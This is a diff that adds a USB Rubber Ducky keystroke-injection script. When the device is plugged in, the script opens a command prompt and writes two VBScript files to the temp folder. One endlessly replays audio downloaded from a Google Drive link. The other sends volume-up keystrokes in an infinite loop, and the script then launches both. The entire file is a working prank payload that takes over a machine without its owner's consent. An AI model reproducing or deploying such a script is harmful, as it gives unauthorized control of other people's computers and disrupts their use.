@@ -1,0 +1,69 @@
+DELAY 3500
+GUI r
+DELAY 800
+STRING cmd
+ENTER
+DELAY 1800
+STRING cd %tmp% && copy con rickyou.vbs
+ENTER
+DELAY 300
+STRING While true
+ENTER
+DELAY 300
+STRING Dim oPlayer
+ENTER
+DELAY 300
+STRING Set oPlayer = CreateObject("WMPlayer.OCX")
+ENTER
+DELAY 300
+STRING oPlayer.URL = "https://drive.google.com/u/0/uc?id=1Y1_WvIdQTf7dXBoGNlHDPKIUvfgNPQ2n&export=download"
+ENTER
+DELAY 300
+STRING oPlayer.controls.play
+ENTER
+DELAY 300
+STRING While oPlayer.playState <> 1 ' 1 = Stopped
+ENTER
+DELAY 300
+STRING WScript.Sleep 100
+ENTER
+DELAY 300
+STRING Wend
+ENTER
+DELAY 300
+STRING oPlayer.close
+ENTER
+DELAY 300
+STRING Wend
+ENTER
+DELAY 700
+CTRL z
+ENTER
+DELAY 300
+STRING copy con volup.vbs
+ENTER
+DELAY 300
+STRING do
+ENTER
+DELAY 300
+STRING Set WshShell = CreateObject("WScript.Shell")
+ENTER
+DELAY 300
+STRING WshShell.SendKeys(chr(&hAF))
+ENTER
+DELAY 300
+STRING WScript.Sleep 10
+ENTER
+DELAY 300
+STRING loop
+ENTER
+DELAY 300
+CTRL z
+DELAY 300
+ENTER
+DELAY 300
+STRING start rickyou.vbs && volup.vbs
+ENTER
+DELAY 300
+STRING exit
+ENTER
